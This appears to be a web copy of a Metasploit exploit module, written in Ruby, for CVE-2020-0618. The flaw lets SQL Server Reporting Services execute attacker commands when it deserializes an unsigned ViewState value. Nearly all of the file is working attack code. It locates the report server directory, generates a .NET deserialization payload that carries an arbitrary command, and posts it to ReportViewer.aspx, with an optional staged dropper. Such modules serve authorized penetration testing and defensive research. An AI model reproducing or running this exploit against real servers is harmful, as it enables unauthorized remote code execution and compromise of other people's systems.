# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;SQL Server Reporting Services (SSRS) ViewState Deserialization&#039;,
      &#039;Description&#039; => %q{
        A vulnerability exists within Microsoft&#039;s SQL Server Reporting Services
        which can allow an attacker to craft an HTTP POST request with a
        serialized object to achieve remote code execution. The vulnerability is
        due to the fact that the serialized blob is not signed by the server.
      },
      &#039;Author&#039; => [
        &#039;Soroush Dalili&#039;,   # discovery and original PoC
        &#039;Spencer McIntyre&#039;  # metasploit module
      ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2020-0618&#039;],
        [&#039;URL&#039;, &#039;https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/&#039;],
      ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows (x86)&#039;, { &#039;Arch&#039; => ARCH_X86, &#039;Type&#039; => :windows_dropper } ],
          [ &#039;Windows (x64)&#039;, { &#039;Arch&#039; => ARCH_X64, &#039;Type&#039; => :windows_dropper } ],
          [ &#039;Windows (cmd)&#039;, { &#039;Arch&#039; => ARCH_CMD, &#039;Type&#039; => :windows_command, &#039;Space&#039; => 3000 } ]
        ],
      &#039;DefaultTarget&#039;  => 1,
      &#039;DisclosureDate&#039; => &#039;2020-02-11&#039;,
      &#039;Notes&#039;          =>
        {
          &#039;Stability&#039;   => [ CRASH_SAFE, ],
          &#039;SideEffects&#039; => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],
          &#039;Reliability&#039; => [ REPEATABLE_SESSION, ],
        },
      &#039;Privileged&#039;     => true,
    ))

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The base path to the web application&#039;, &#039;/Reports&#039; ]),
      OptString.new(&#039;DOMAIN&#039;,    [ true, &#039;The domain to use for Windows authentication&#039;, &#039;WORKSTATION&#039; ]),
      OptString.new(&#039;USERNAME&#039;,  [ true, &#039;Username to authenticate as&#039;, &#039;&#039; ]),
      OptString.new(&#039;PASSWORD&#039;,  [ true, &#039;The password to authenticate with&#039; ])
    ])
    register_advanced_options([
      OptFloat.new(&#039;CMDSTAGER::DELAY&#039;, [ true, &#039;Delay between command executions&#039;, 0.5 ]),
    ])
  end

  def send_api_request(*parts)
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;api&#039;, &#039;v1.0&#039;, *parts),
      &#039;headers&#039;   => {
        &#039;Accept&#039;  => &#039;application/json&#039;,
      },
      &#039;username&#039;  => datastore[&#039;USERNAME&#039;],
      &#039;password&#039;  => datastore[&#039;PASSWORD&#039;]
    })
    if res&.code == 200 && res.headers[&#039;Content-Type&#039;].strip.start_with?(&#039;application/json;&#039;)
      return res.get_json_document
    end
  end

  def check
    json_response = send_api_request(&#039;ReportServerInfo&#039;, &#039;Model.SiteName&#039;)
    return CheckCode::Unknown unless json_response && json_response[&#039;value&#039;] == &#039;SQL Server Reporting Services&#039;
    CheckCode::Detected
  end

  def exploit
    fail_with(Failure::NotFound, &#039;Failed to detect the application&#039;) unless check == CheckCode::Detected

    json_response = send_api_request(&#039;ReportServerInfo&#039;, &#039;Model.GetVirtualDirectory&#039;)
    fail_with(Failure::UnexpectedReply, &#039;Failed to detect the report server virtual directory&#039;) if json_response.nil?
    directory = json_response[&#039;value&#039;]
    vprint_status("Detected the report server virtual directory as: #{directory}")

    state = {vd: directory}
    if target[&#039;Type&#039;] == :windows_command
      execute_command(payload.encoded, state: state)
    else
      cmd_target = targets.select { |target| target[&#039;Type&#039;] == :windows_command }.first
      execute_cmdstager({linemax: cmd_target.opts[&#039;Space&#039;], delay: datastore[&#039;CMDSTAGER::DELAY&#039;], state: state})
    end
  end

  def execute_command(cmd, opts)
    state = opts[:state]
    viewstate = Rex::Text.encode_base64(::Msf::Util::DotNetDeserialization.generate(cmd))

    res = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(state[:vd], &#039;Pages&#039;, &#039;ReportViewer.aspx&#039;),
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;NavigationCorrector$PageState&#039; => &#039;NeedsCorrection&#039;,
        &#039;NavigationCorrector$ViewState&#039; => viewstate,
        &#039;__VIEWSTATE&#039;                   => &#039;&#039;
      },
      &#039;username&#039; => datastore[&#039;USERNAME&#039;],
      &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
    })

    unless res&.code == 200
      print_error(&#039;Non-200 HTTP response received while trying to execute the command&#039;)
    end

  end
end

